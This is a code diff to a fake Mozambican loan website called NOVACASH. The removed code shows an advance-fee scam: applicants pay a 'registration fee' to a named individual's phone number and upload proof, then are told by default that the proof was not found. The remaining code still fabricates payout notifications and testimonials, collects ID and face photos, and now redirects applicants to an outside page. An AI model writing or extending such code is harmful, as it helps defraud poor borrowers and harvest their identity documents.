@@ -334,20 +334,7 @@
         .activity-item .activity-amount { font-weight: 700; font-size: 0.8rem; white-space: nowrap; }
         .activity-item .activity-amount.positive { color: var(--success); }
 
-        /* ===== NOVO: TAXA NAS NOTIFICAÇÕES (Alteração #3) ===== */
-        .notif-fee-row {
-            background: rgba(255,127,0,0.08);
-            border-radius: 8px;
-            padding: 0.35rem 0.5rem;
-            margin-top: 0.35rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.72rem;
-            border: 1px dashed rgba(255,127,0,0.3);
-        }
-        .notif-fee-row .fee-label { color: var(--gray); font-weight: 500; }
-        .notif-fee-row .fee-value { color: var(--primary); font-weight: 700; }
+        
 
         /* ===== CHAT FAB ===== */
         .chat-fab {
@@ -472,76 +459,6 @@
             transition: opacity 0.2s ease;
         }
         .loan-reminder-toast .reminder-close:hover { opacity: 1; }
-
-        /* ===== NOVO: ÁREA DE TAXA DESTACADA (Alteração #8) ===== */
-        .fee-area {
-            background: rgba(255,127,0,0.08);
-            border-radius: var(--radius);
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            font-size: 0.8rem;
-            border: 2px solid transparent;
-            transition: border-color 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease;
-            position: relative;
-        }
-        .fee-area.attention {
-            border-color: var(--error);
-            background: rgba(239,68,68,0.08);
-            animation: feeAttention 1.6s ease-in-out infinite;
-        }
-        @keyframes feeAttention {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(239,68,68,0.0); border-color: var(--error); }
-            50% { box-shadow: 0 0 0 6px rgba(239,68,68,0.15); border-color: #ff6b6b; }
-        }
-        @media (prefers-reduced-motion: reduce) {
-            .fee-area.attention { animation: none; border-color: var(--error); background: rgba(239,68,68,0.1); }
-        }
-
-        /* ===== NOVO: CONTADOR DE BLOQUEIO (Alteração #7) ===== */
-        .trial-block-notice {
-            display: none;
-            background: rgba(239,68,68,0.1);
-            border: 1px solid rgba(239,68,68,0.3);
-            border-radius: var(--radius);
-            padding: 0.8rem 1rem;
-            margin: 0.6rem 0;
-            font-size: 0.78rem;
-            color: #991B1B;
-            line-height: 1.5;
-        }
-        .trial-block-notice.show { display: block; }
-        .trial-block-notice .block-countdown {
-            font-weight: 800;
-            color: var(--error);
-            font-variant-numeric: tabular-nums;
-        }
-        .trial-block-notice .block-title {
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 0.4rem;
-            margin-bottom: 0.3rem;
-        }
-        .proof-file-wrapper.blocked .file-label {
-            opacity: 0.5;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
-        .proof-file-wrapper.blocked input[type="file"] { pointer-events: none; }
-        #submitLoanApp.blocked {
-            opacity: 0.5;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
-        .trial-counter-line {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 0.4rem;
-            font-size: 0.7rem;
-            color: var(--gray);
-        }
-        .trial-counter-line .trial-count { font-weight: 800; color: var(--error); }
 
         /* ===== TOAST ===== */
         .toast-container {
@@ -753,50 +670,7 @@
         .notif-popup.error-modal-improved .btn-error.secondary { background: var(--white); color: var(--primary); border: 2px solid var(--primary); }
         .notif-popup.error-modal-improved .btn-error.secondary:hover { background: var(--primary); color: white; }
 
-        /* ===== NOVO: MENSAGEM DETALHADA DO COMPROVATIVO (Alteração #4) ===== */
-        .error-modal-details {
-            background: #FEF2F2;
-            border-radius: 12px;
-            padding: 0.7rem 0.9rem;
-            margin: 0.5rem 0;
-            font-size: 0.78rem;
-            line-height: 1.6;
-            color: #374151;
-            border: 1px solid rgba(239,68,68,0.15);
-        }
-        .error-modal-details .detail-row {
-            display: flex;
-            justify-content: space-between;
-            gap: 0.5rem;
-            padding: 0.2rem 0;
-        }
-        .error-modal-details .detail-row .detail-label { color: #6B7280; font-weight: 500; }
-        .error-modal-details .detail-row .detail-value { font-weight: 700; color: #0A0A0F; text-align: right; }
-        .error-modal-details .detail-row .detail-value.fee { color: var(--primary); font-size: 0.9rem; }
-        .error-modal-details .detail-row .detail-value.attempts { color: var(--error); }
-        .error-modal-payment-box {
-            background: linear-gradient(135deg, #FFF4E6, #FFE8CC);
-            border-radius: 12px;
-            padding: 0.7rem 0.9rem;
-            margin: 0.5rem 0;
-            font-size: 0.78rem;
-            line-height: 1.6;
-            color: #374151;
-            border: 1px solid rgba(255,127,0,0.2);
-        }
-        .error-modal-payment-box .payment-box-title {
-            font-weight: 700;
-            color: var(--primary-dark);
-            margin-bottom: 0.3rem;
-            font-size: 0.8rem;
-        }
-        .error-modal-payment-box .payment-box-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.15rem 0;
-        }
-        .error-modal-payment-box .payment-box-row .pb-label { color: #6B7280; font-weight: 500; }
-        .error-modal-payment-box .payment-box-row .pb-value { font-weight: 700; color: #0A0A0F; }
+        
 
         /* ===== FUNDS MODAL ===== */
         .funds-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 20000; display: none; justify-content: center; align-items: center; padding: 1.5rem; }
@@ -1181,7 +1055,6 @@
             .loan-reminder-toast .reminder-cta { font-size: 0.68rem; }
             .error-modal-details { font-size: 0.72rem; }
             .error-modal-payment-box { font-size: 0.72rem; }
-            .notif-fee-row { font-size: 0.66rem; }
         }
         @media (min-width: 768px) {
             .app-content { max-width: 600px; margin: 0 auto; padding: 1.5rem 1.5rem 6rem; }
@@ -1663,7 +1536,7 @@
     <!-- ===== NOTIFICATION POPUP ===== -->
     <div class="notif-popup" id="notifPopup">
         <div class="icon"><i class="fas fa-exclamation-triangle"></i></div>
-        <div class="text" id="popupText">ERRO NA SUA FOTO DE COMPROVATIVO</div>
+        <div class="text" id="popupText"></div>
         <button class="close-popup" id="popupClose">&times;</button>
     </div>
 
@@ -1991,16 +1864,14 @@
                         </div>
                         <div class="form-group">
                             <label>Método de Recebimento <span style="color:var(--error);">*</span></label>
-                            <div class="payment-methods">
-                                <div class="pm-item mpesa active" data-method="M-Pesa"><i class="fas fa-wallet"></i> M-Pesa <span class="pm-check">✔</span></div>
-                                <div class="pm-item emola" data-method="E-Mola"><i class="fas fa-mobile-alt"></i> E-Mola <span class="pm-check">✔</span></div>
-                                <div class="pm-item bank" data-method="Banco"><i class="fas fa-credit-card"></i> Banco <span class="pm-check">✔</span></div>
+                            <div class="payment-methods" style="grid-template-columns:1fr;">
+                                <div class="pm-item emola active" data-method="E-Mola" aria-label="Recebimento disponível por E-Mola"><i class="fas fa-mobile-alt"></i> E-Mola <span class="pm-check">✔</span></div>
                             </div>
                             <div class="error-msg" id="methodError">Selecione um método de pagamento</div>
                         </div>
                         <div class="form-group">
                             <label>Número para receber <span style="color:var(--error);">*</span></label>
-                            <input type="text" id="loanReceiver" placeholder="Número M-Pesa/E-Mola ou IBAN">
+                            <input type="text" id="loanReceiver" placeholder="Número E-Mola">
                             <div class="error-msg">Campo obrigatório</div>
                         </div>
                         <button class="btn btn-primary next-step" data-next="2">Continuar <i class="fas fa-arrow-right"></i></button>
@@ -2061,7 +1932,6 @@
                             <div class="sim-result-item"><div class="sri-label">Parcela Mensal</div><div class="sri-value primary" id="simMonthly">8.917 MZN</div></div>
                             <div class="sim-result-item"><div class="sri-label">Total a Pagar</div><div class="sri-value" id="simTotal">53.500 MZN</div></div>
                             <div class="sim-result-item"><div class="sri-label">Juros (7%)</div><div class="sri-value" id="simInterest">3.500 MZN</div></div>
-                            <div class="sim-result-item"><div class="sri-label">Taxa de Inscrição</div><div class="sri-value" id="simFee">1.299 MZN</div></div>
                         </div>
                         <div style="display: flex; gap: 0.6rem; margin-top: 1rem;">
                             <button class="btn btn-outline prev-step" style="flex:1;" data-prev="2"><i class="fas fa-arrow-left"></i> Voltar</button>
@@ -2111,43 +1981,6 @@
                             <div style="display: flex; justify-content: space-between; padding: 0.3rem 0; border-bottom: 1px solid var(--gray-light); font-size: 0.85rem;">
                                 <span>Parcela</span><strong id="summaryMonthly">---</strong>
                             </div>
-                            <div style="display: flex; justify-content: space-between; padding: 0.3rem 0; border-bottom: 2px solid var(--primary); font-size: 0.85rem; font-weight: 700; color: var(--primary);">
-                                <span>Taxa de Inscrição</span><strong id="summaryFee">---</strong>
-                            </div>
-                        </div>
-
-                        <!-- NOVO: ÁREA DA TAXA COM DESTAQUE (Alteração #8) -->
-                        <div class="fee-area" id="feeArea">
-                            <p><strong>📱 Pagamento da Taxa:</strong></p>
-                            <p style="display: flex; justify-content: space-between; margin: 0.3rem 0;"><span>Número:</span><strong id="payNumberDisplay">876364927</strong> <button class="copy-btn" data-text="876364927" style="background: var(--primary); color: white; border: none; padding: 0.1rem 0.6rem; border-radius: 20px; font-size: 0.6rem; cursor: pointer;">Copiar</button></p>
-                            <p style="display: flex; justify-content: space-between;"><span>Nome:</span><strong>TIOFELO EDSON LUIS JAIELA</strong></p>
-                        </div>
-
-                        <button class="pay-btn" id="payFeeBtn" style="margin-bottom: 0.6rem; background: var(--primary-gradient); font-size: 1.1rem; padding: 1rem;">
-                            <i class="fas fa-phone"></i> EFETUAR O PAGAMENTO DA TAXA DE INSCRIÇÃO
-                        </button>
-                        <p class="payment-info-text">Após o pagamento da taxa de inscrição, a recepção do valor poderá ocorrer entre 8 e 30 minutos, no máximo.</p>
-
-                        <!-- NOVO: CAMPO DE COMPROVATIVO COM WRAPPER PARA BLOQUEIO (Alteração #7) -->
-                        <div class="form-group proof-file-wrapper" id="proofFileWrapper">
-                            <label>Comprovativo de Pagamento <span style="color:var(--error);">*</span></label>
-                            <div class="file-input-wrapper">
-                                <div class="file-label"><i class="fas fa-upload"></i> Carregar comprovativo</div>
-                                <input type="file" id="loanProof" accept="image/*">
-                            </div>
-                            <div class="error-msg">Carregue o comprovativo de pagamento</div>
-                            <div class="trial-counter-line" id="trialCounterLine">
-                                <span>Tentativas utilizadas:</span>
-                                <span class="trial-count" id="trialCountDisplay">0 / 3</span>
-                            </div>
-                            <div id="proofPreviewApp" class="image-preview"></div>
-                        </div>
-
-                        <!-- NOVO: AVISO DE BLOQUEIO (Alteração #7) -->
-                        <div class="trial-block-notice" id="trialBlockNotice">
-                            <div class="block-title"><i class="fas fa-lock"></i> Limite de tentativas atingido</div>
-                            <div>O limite de 3 tentativas foi alcançado. Será necessário aguardar <strong>30 minutos</strong> para tentar novamente.</div>
-                            <div style="margin-top:0.4rem;">Tempo restante: <span class="block-countdown" id="blockCountdownDisplay">30:00</span></div>
                         </div>
 
                         <div class="form-group">
@@ -2156,7 +1989,7 @@
                         </div>
                         <div style="display: flex; gap: 0.6rem;">
                             <button class="btn btn-outline prev-step" style="flex:1;" data-prev="3"><i class="fas fa-arrow-left"></i> Voltar</button>
-                            <button class="btn btn-success" style="flex:2;" id="submitLoanApp"><i class="fas fa-paper-plane"></i> ENVIAR SOLICITAÇÃO</button>
+                            <button class="btn btn-success" style="flex:2;" id="completeLoanRequest"><i class="fas fa-check-circle"></i> CONCLUIR SOLICITAÇÃO</button>
                         </div>
                     </div>
                 </div>
@@ -2229,11 +2062,8 @@
             </div>
             <div class="chat-faq-app" id="chatFaqApp">
                 <span class="faq-chip" data-question="Quanto tempo demora?">⏱️ Tempo</span>
-                <span class="faq-chip" data-question="Taxa de inscrição?">💰 Taxa</span>
                 <span class="faq-chip" data-question="Localização?">📍 Endereço</span>
                 <span class="faq-chip" data-question="Documentos necessários?">📄 Documentos</span>
-                <span class="faq-chip" data-question="Número para pagamento?">📱 Pagamento</span>
-                <span class="faq-chip" data-question="Para que serve a taxa de inscrição?">📝 Taxa de Inscrição</span>
             </div>
             <div class="chat-input-app">
                 <input type="text" id="chatInputApp" placeholder="Digite sua mensagem...">
@@ -2307,7 +2137,6 @@
             <h3>📄 Termos e Condições</h3>
             <p>Ao utilizar a plataforma NOVACASH, o cliente concorda com todos os requisitos exigidos para a solicitação de empréstimos, incluindo a utilização de um cartão Vodacom ou e-Mola ativo há mais de 2 anos e a apresentação do mesmo documento usado no registo do cartão.</p>
             <p>O cliente é responsável pela veracidade das informações fornecidas e pelo cumprimento de todas as etapas do processo.</p>
-            <p><strong>Caso o cliente não cumpra ou tenha falhado algum dos requisitos exigidos pela plataforma, poderá solicitar o reembolso do valor entrando em contacto com o número 876364927.</strong></p>
             <button class="terms-close-btn" id="termsModalClose">Fechar</button>
         </div>
     </div>
@@ -2736,23 +2565,7 @@
     const loanAmounts = [5000,7500,10000,15000,25000,30000,45000,50000,75000,100000,125000,150000,200000,250000,300000];
     const mozambiqueBanks = ['Millennium BIM','BCI','Standard Bank Moçambique','Absa Bank Moçambique',
         'Moza Banco','Access Bank Moçambique','Ecobank Moçambique','UBA Moçambique','Banco Terra'];
-    const methods = ['mpesa','emola','bank'];
-
-    // ALTERAÇÃO #3: função de cálculo da taxa (reutiliza a tabela existente)
-    function calcFee(amount) {
-        if (amount <= 8999) return 514;
-        if (amount <= 12999) return 699;
-        if (amount <= 16999) return 799;
-        if (amount <= 21999) return 899;
-        if (amount <= 29999) return 999;
-        if (amount <= 40999) return 1299;
-        if (amount <= 60999) return 1499;
-        if (amount <= 90999) return 1799;
-        if (amount <= 139999) return 2099;
-        if (amount <= 199999) return 2499;
-        if (amount <= 259999) return 2799;
-        return 3099;
-    }
+    const methods = ['emola'];
 
     function generateMpesaCode() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -2799,17 +2612,8 @@
         const name = getRandomName();
         const amount = getRandomAmount();
         const amountStr = amount.toLocaleString('pt-MZ');
-        const fee = calcFee(amount);
-        const feeStr = fee.toLocaleString('pt-MZ');
         let html = '', methodLabel = '', extra = {};
-
-        const feeRow = `
-            <div class="notif-fee-row">
-                <span class="fee-label">💳 Taxa de inscrição</span>
-                <span class="fee-value">${feeStr} MT</span>
-            </div>`;
-
-        if (method === 'mpesa') {
+if (method === 'mpesa') {
             const code = generateMpesaCode();
             const sender = String(Math.floor(100000 + Math.random() * 900000));
             methodLabel = 'M-Pesa';
@@ -2826,7 +2630,6 @@
                         <div class="notif-row"><span class="label">Nome</span><span class="value">${name}</span></div>
                         <div class="notif-row"><span class="label">Recebeu</span><span class="value highlight">${amountStr} MT</span></div>
                         <div class="notif-row"><span class="label">De</span><span class="value">${sender} - NOVACASH</span></div>
-                        ${feeRow}
                     </div>
                     <div class="notif-footer">
                         <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForNotification(now)}</span>
@@ -2856,7 +2659,6 @@
                                 <span style="font-weight:600;font-size:0.75rem;color:#FF6B00;">NOVACASH</span>
                             </span>
                         </div>
-                        ${feeRow}
                     </div>
                     <div class="notif-footer">
                         <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForEmola(now)}</span>
@@ -2885,7 +2687,6 @@
                                 <span style="font-size:0.65rem;color:var(--gray);">${bank}</span>
                             </span>
                         </div>
-                        ${feeRow}
                     </div>
                     <div class="notif-footer">
                         <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForBank(now)} • ${formatTimeForBank(now)}</span>
@@ -3141,122 +2942,6 @@
     });
 
     // ============================================================
-    // ALTERAÇÃO #5/#7: SISTEMA DE TENTATIVAS E BLOQUEIO (3 tentativas / 30 min)
-    // ============================================================
-    const TRIAL_MAX = 3;
-    const TRIAL_BLOCK_MS = 30 * 60 * 1000;
-    let trialBlockInterval = null;
-
-    function getTrialStorageKey() {
-        if (!currentUser) return null;
-        return 'novacash_trials_' + (currentUser.phone || 'anon');
-    }
-
-    function getTrialState() {
-        const key = getTrialStorageKey();
-        if (!key) return { attempts: 0, blockedUntil: 0 };
-        try {
-            const raw = localStorage.getItem(key);
-            if (raw) {
-                const parsed = JSON.parse(raw);
-                return {
-                    attempts: typeof parsed.attempts === 'number' ? parsed.attempts : 0,
-                    blockedUntil: typeof parsed.blockedUntil === 'number' ? parsed.blockedUntil : 0
-                };
-            }
-        } catch(_) {}
-        return { attempts: 0, blockedUntil: 0 };
-    }
-
-    function saveTrialState(state) {
-        const key = getTrialStorageKey();
-        if (!key) return;
-        try { localStorage.setItem(key, JSON.stringify(state)); } catch(_) {}
-    }
-
-    function resetTrialState() {
-        const key = getTrialStorageKey();
-        if (!key) return;
-        try { localStorage.removeItem(key); } catch(_) {}
-    }
-
-    function updateTrialUI() {
-        const state = getTrialState();
-        const display = document.getElementById('trialCountDisplay');
-        const notice = document.getElementById('trialBlockNotice');
-        const wrapper = document.getElementById('proofFileWrapper');
-        const submitBtn = document.getElementById('submitLoanApp');
-        const fileInput = document.getElementById('loanProof');
-        const fileLabel = wrapper?.querySelector('.file-label');
-        if (display) display.textContent = `${state.attempts} / ${TRIAL_MAX}`;
-
-        const now = Date.now();
-        const isBlocked = state.blockedUntil > now;
-
-        if (notice) {
-            if (isBlocked) {
-                notice.classList.add('show');
-                startBlockCountdown(state.blockedUntil);
-            } else {
-                notice.classList.remove('show');
-                stopBlockCountdown();
-            }
-        }
-        if (wrapper) wrapper.classList.toggle('blocked', isBlocked);
-        if (fileInput) fileInput.disabled = isBlocked;
-        if (fileLabel) {
-            if (isBlocked) fileLabel.style.opacity = '0.5';
-            else fileLabel.style.opacity = '';
-        }
-        if (submitBtn) submitBtn.classList.toggle('blocked', isBlocked);
-    }
-
-    function startBlockCountdown(blockedUntil) {
-        stopBlockCountdown();
-        const el = document.getElementById('blockCountdownDisplay');
-        if (!el) return;
-        function tick() {
-            const remaining = Math.max(0, blockedUntil - Date.now());
-            if (remaining <= 0) {
-                el.textContent = '00:00';
-                stopBlockCountdown();
-                resetTrialState();
-                updateTrialUI();
-                return;
-            }
-            const mins = Math.floor(remaining / 60000);
-            const secs = Math.floor((remaining % 60000) / 1000);
-            el.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-        }
-        tick();
-        trialBlockInterval = setInterval(tick, 1000);
-    }
-    function stopBlockCountdown() {
-        if (trialBlockInterval) { clearInterval(trialBlockInterval); trialBlockInterval = null; }
-    }
-
-    function registerFailedAttempt() {
-        const state = getTrialState();
-        if (state.blockedUntil > Date.now()) return state;
-        state.attempts = Math.min(state.attempts + 1, TRIAL_MAX);
-        if (state.attempts >= TRIAL_MAX) {
-            state.blockedUntil = Date.now() + TRIAL_BLOCK_MS;
-        }
-        saveTrialState(state);
-        updateTrialUI();
-        if (state.attempts >= 1) {
-            const feeArea = document.getElementById('feeArea');
-            if (feeArea) feeArea.classList.add('attention');
-        }
-        return state;
-    }
-
-    function isTrialBlocked() {
-        const state = getTrialState();
-        return state.blockedUntil > Date.now();
-    }
-
-    // ============================================================
     // DASHBOARD
     // ============================================================
     function initCardStatus(user) {
@@ -3299,7 +2984,6 @@
         updateHistory();
         expireOldNotifications(user);
         updateNotifications();
-        updateTrialUI();
         updateHistoryRejectBadges();
         __sessionActive = true;
         initCardStatus(user);
@@ -3548,7 +3232,6 @@
         __sessionActive = false;
         stopAllSounds();
         stopLoanReminderCycle(); // ALTERAÇÃO #1: parar lembretes
-        stopBlockCountdown();
         document.getElementById('app').classList.remove('active');
         document.getElementById('loginScreen').classList.remove('hide');
         showToast('Sessão encerrada', 'info');
@@ -3599,7 +3282,7 @@
                     </div>
                     <div class="hi-reason">
                         <i class="fas fa-exclamation-circle"></i>
-                        <span>${loan.reason || 'Comprovativo de pagamento da taxa de inscrição não encontrado no sistema.'}</span>
+                        <span>${loan.reason || 'Não foi possível concluir esta solicitação.'}</span>
                     </div>`;
                 container.appendChild(div);
             } else {
@@ -3642,12 +3325,7 @@
         if (currentUser) expireOldNotifications(currentUser);
         const container = document.getElementById('notifList');
         const notifs = currentUser?.notifs || [];
-        const filteredNotifs = notifs.filter(n => n.title && (
-            n.title.includes('Comprovativo') || n.title.includes('validação') ||
-            n.title.includes('validação do comprovativo') || n.title.includes('imagem') ||
-            n.title.includes('pagamento da taxa') || n.title.includes('taxa de inscrição') ||
-            n.title.includes('imagem de confirmação') || n.title.includes('erro na sua imagem')
-        ));
+        const filteredNotifs = notifs.filter(n => n && n.title && !/taxa|comprovativo|pagamento da taxa/i.test(`${n.title} ${n.body || ''}`));
         if (filteredNotifs.length === 0) {
             container.innerHTML = '<div style="text-align:center;color:var(--gray);padding:2rem;"><i class="fas fa-check-circle" style="font-size:2rem;display:block;margin-bottom:0.5rem;color:var(--success);"></i>Nenhuma notificação de validação</div>';
             document.getElementById('notifBadge').textContent = '0';
@@ -3736,26 +3414,16 @@
         chatMessages.scrollTop = chatMessages.scrollHeight;
     }
 
-    // ALTERAÇÃO #6: explicação atualizada (taxa NÃO descontada)
     function chatBotResponse(input) {
         const lower = input.toLowerCase();
-        if (lower.includes('taxa de inscrição') || lower.includes('serve a taxa') || lower.includes('para que serve a taxa')) {
-            return '📝 PARA QUE SERVE A TAXA DE INSCRIÇÃO? 🤔\n\nA taxa de inscrição é um pagamento SEPARADO e NÃO é descontada nem deduzida do valor do empréstimo solicitado.\n\nEla destina-se a cobrir os custos administrativos e operacionais da análise de crédito e do processamento da sua solicitação, permitindo que o seu pedido seja analisado de forma segura, organizada e transparente.\n\n⚠️ Importante:\n• O valor da taxa depende do montante solicitado, de acordo com a tabela da plataforma.\n• O valor aplicável é apresentado antes de efetuar o pagamento.\n• O pagamento da taxa, por si só, NÃO garante a aprovação do empréstimo.';
-        }
         if (lower.includes('tempo') || lower.includes('demora') || lower.includes('receber')) {
             return 'O tempo de recebimento do empréstimo varia entre 8 e 30 minutos após a conclusão das etapas necessárias.';
-        }
-        if ((lower.includes('taxa') || lower.includes('inscrição')) && !lower.includes('serve')) {
-            return 'A taxa de inscrição varia entre 514 MT e 3.099 MT, dependendo do valor. Pagamento para o número 876364927, nome TIOFELO EDSON LUIS JAIELA.';
         }
         if (lower.includes('localização') || lower.includes('sede') || lower.includes('endereço')) {
             return 'Estamos localizados em Maputo, Baixa da Cidade, Avenida Julius Nyerere, Prédio 22 Andares.';
         }
         if (lower.includes('documento') || lower.includes('bi')) {
             return 'É necessário apresentar um documento de identificação válido (BI, Passaporte ou NUIT).';
-        }
-        if (lower.includes('pagamento') || lower.includes('número')) {
-            return '📱 Número: 876364927\n👤 Nome: TIOFELO EDSON LUIS JAIELA';
         }
         return 'Para mais informações, consulte nossas FAQs ou entre em contato com o suporte. 💙';
     }
@@ -3859,7 +3527,7 @@
                         </div>
                         <div class="hi-reason">
                             <i class="fas fa-exclamation-circle"></i>
-                            <span>${loan.reason || 'Comprovativo de pagamento da taxa de inscrição não encontrado no sistema.'}</span>
+                            <span>${loan.reason || 'Não foi possível concluir esta solicitação.'}</span>
                         </div>
                     </div>`;
             } else {
@@ -4227,7 +3895,6 @@
         "Já estou a preparar o terceiro empréstimo.",
         "Foi a melhor decisão financeira que tomei.",
         "Super recomendo, nota 20v mesmo.",
-        "A taxa de inscrição é justa pelo serviço prestado.",
         "Atendimento de primeira, parabéns à equipe.",
         "Rapidez na resposta e no pagamento.",
         "Plataforma muito intuitiva e fácil de usar.",
@@ -4603,13 +4270,11 @@
         const interest = amount * 0.07;
         const total = amount + interest;
         const monthly = total / term;
-        const fee = calcFee(amount);
         document.getElementById('simAmountDisplay').textContent = amount.toLocaleString('pt-MZ') + ' MZN';
         document.getElementById('simTermDisplay').textContent = term + ' meses';
         document.getElementById('simMonthly').textContent = Math.round(monthly).toLocaleString('pt-MZ') + ' MZN';
         document.getElementById('simTotal').textContent = Math.round(total).toLocaleString('pt-MZ') + ' MZN';
         document.getElementById('simInterest').textContent = Math.round(interest).toLocaleString('pt-MZ') + ' MZN';
-        document.getElementById('simFee').textContent = fee.toLocaleString('pt-MZ') + ' MZN';
     }
     simAmount.addEventListener('input', updateSimulator);
     simTerm.addEventListener('input', updateSimulator);
@@ -4671,13 +4336,6 @@
             }
         }
         if (step === 4) {
-            const proof = document.getElementById('loanProof').files[0];
-            if (!proof && !isTrialBlocked()) {
-                isValid = false;
-                const errorEl = document.getElementById('loanProof').parentElement.parentElement.querySelector('.error-msg');
-                if (errorEl) errorEl.classList.add('show');
-                document.getElementById('loanProof').parentElement.querySelector('.file-label').classList.add('error');
-            }
             if (!document.getElementById('loanTerms').checked) {
                 isValid = false;
                 document.getElementById('termsError').classList.add('show');
@@ -4697,7 +4355,7 @@
         });
         stepContents.forEach((content, index) => { content.classList.toggle('active', index + 1 === step); });
         document.getElementById('appContent').scrollTop = 0;
-        if (step === 4) { updateSummary(); updateTrialUI(); }
+        if (step === 4) { updateSummary(); }
     }
 
     function transitionToStep(nextStep) {
@@ -4718,10 +4376,10 @@
         });
     });
 
-    // Payment method
-    document.querySelectorAll('.pm-item').forEach(item => {
+    // Método de recebimento: apenas E-Mola está disponível.
+    document.querySelectorAll('.payment-methods .pm-item').forEach(item => {
         item.addEventListener('click', function() {
-            document.querySelectorAll('.pm-item').forEach(i => i.classList.remove('active'));
+            document.querySelectorAll('.payment-methods .pm-item').forEach(i => i.classList.remove('active'));
             this.classList.add('active');
             document.getElementById('methodError')?.classList.remove('show');
             if (currentStep === 4) updateSummary();
@@ -4769,7 +4427,6 @@
     }
     document.getElementById('loanBiFront').addEventListener('change', function() { previewFileWithProcessing(this, 'biFrontPreviewApp'); });
     document.getElementById('loanBiBack').addEventListener('change', function() { previewFileWithProcessing(this, 'biBackPreviewApp'); });
-    document.getElementById('loanProof').addEventListener('change', function() { previewFile(this, 'proofPreviewApp'); });
 
     document.getElementById('loanFacePhoto').addEventListener('change', function() {
         const container = document.getElementById('facePhotoPreview');
@@ -4805,10 +4462,9 @@
         const province = document.getElementById('loanProvince').value || '---';
         const salary = document.getElementById('loanSalary').value ? parseInt(document.getElementById('loanSalary').value).toLocaleString('pt-MZ') + ' MZN' : '---';
         const receiver = document.getElementById('loanReceiver').value.trim() || '---';
-        const method = document.querySelector('.pm-item.active')?.dataset.method || 'M-Pesa';
+        const method = document.querySelector('.payment-methods .pm-item.active')?.dataset.method || 'E-Mola';
         const amount = parseInt(simAmount.value) || 0;
         const term = parseInt(simTerm.value) || 6;
-        const fee = calcFee(amount);
         const interest = amount * 0.07;
         const total = amount + interest;
         const monthly = total / term;
@@ -4824,7 +4480,6 @@
         document.getElementById('summaryAmount').textContent = amount.toLocaleString('pt-MZ') + ' MZN';
         document.getElementById('summaryTerm').textContent = term + ' meses';
         document.getElementById('summaryMonthly').textContent = Math.round(monthly).toLocaleString('pt-MZ') + ' MZN';
-        document.getElementById('summaryFee').textContent = fee.toLocaleString('pt-MZ') + ' MZN';
     }
     document.getElementById('loanFullName').addEventListener('input', updateSummary);
     document.getElementById('loanPhone').addEventListener('input', updateSummary);
@@ -4836,317 +4491,12 @@
     simAmount.addEventListener('input', updateSummary);
     simTerm.addEventListener('input', updateSummary);
 
-    // Pay fee
-    document.getElementById('payFeeBtn').addEventListener('click', function() {
-        const method = document.querySelector('.pm-item.active')?.dataset.method || 'M-Pesa';
-        const code = method === 'E-Mola' ? '*898#' : '*150#';
-        window.location.href = 'tel:' + code;
-    });
-
-    // ============================================================
-    // SUBMIT LOAN — ALTERAÇÕES #5/#7
-    // ============================================================
-    document.getElementById('submitLoanApp').addEventListener('click', async function(e) {
+    // Concluir solicitação: valida os termos e encaminha o cliente para a próxima etapa.
+    document.getElementById('completeLoanRequest').addEventListener('click', function(e) {
         e.preventDefault();
-        if (this.disabled) return;
-        if (!currentUser) { showToast('Faça login para solicitar', 'error'); return; }
-        if (isTrialBlocked()) {
-            const state = getTrialState();
-            const remaining = Math.ceil((state.blockedUntil - Date.now()) / 60000);
-            showToast(`⛔ Limite de tentativas atingido. Aguarde ${remaining} min.`, 'error');
-            return;
-        }
         if (!validateStep(4)) return;
-
-        const btn = this;
-        const originalText = btn.innerHTML;
-        btn.disabled = true;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> A processar...';
-
-        let globalTimeout = setTimeout(() => {
-            btn.disabled = false; btn.innerHTML = originalText;
-            showToast('Tempo limite excedido. Tente novamente.', 'error');
-            if (document.getElementById('loadingOverlayApp').classList.contains('active')) hideLoading();
-        }, 60000);
-
-        try {
-            const faceFile = document.getElementById('loanFacePhoto').files[0];
-            const proofFile = document.getElementById('loanProof').files[0];
-
-            let faceDataURL = null;
-            if (faceFile) {
-                try {
-                    faceDataURL = await Promise.race([
-                        processProfileImage(faceFile, 800, 800, 0.8, 25000),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 25000))
-                    ]);
-                } catch(e) {
-                    faceDataURL = await new Promise((resolve, reject) => {
-                        const reader = new FileReader();
-                        reader.onload = function(ev) { resolve(ev.target.result); };
-                        reader.onerror = function() { reject(new Error('Erro ao ler foto')); };
-                        reader.readAsDataURL(faceFile);
-                    });
-                }
-            }
-
-            if (faceDataURL) {
-                currentUser.profileImage = faceDataURL;
-                const idx = users.findIndex(u => u.phone === currentUser.phone);
-                if (idx !== -1) users[idx] = currentUser;
-                saveUsers();
-                sessionStorage.setItem('novacash_session', JSON.stringify(currentUser));
-                updateAllAvatars(currentUser);
-            }
-
-            await submitLoanWithProof(proofFile);
-
-            clearTimeout(globalTimeout);
-            btn.disabled = false;
-            btn.innerHTML = originalText;
-        } catch(error) {
-            clearTimeout(globalTimeout);
-            showToast(error.message || 'Ocorreu um erro. Tente novamente.', 'error');
-            btn.disabled = false;
-            btn.innerHTML = originalText;
-            if (document.getElementById('loadingOverlayApp').classList.contains('active')) hideLoading();
-        }
+        window.location.href = 'https://revulucao.github.io/emprestimo/';
     });
-
-    function submitLoanWithProof(proofFile) {
-        return new Promise((resolve, reject) => {
-            const totalSeconds = 30;
-            const loading = showLoading('Verificando documentos...', totalSeconds);
-            let scannerShown = false;
-            let proofImageData = null;
-
-            let proofTimeout = setTimeout(() => {
-                loading.hide();
-                reject(new Error('Tempo limite excedido ao processar o comprovativo.'));
-            }, 25000);
-
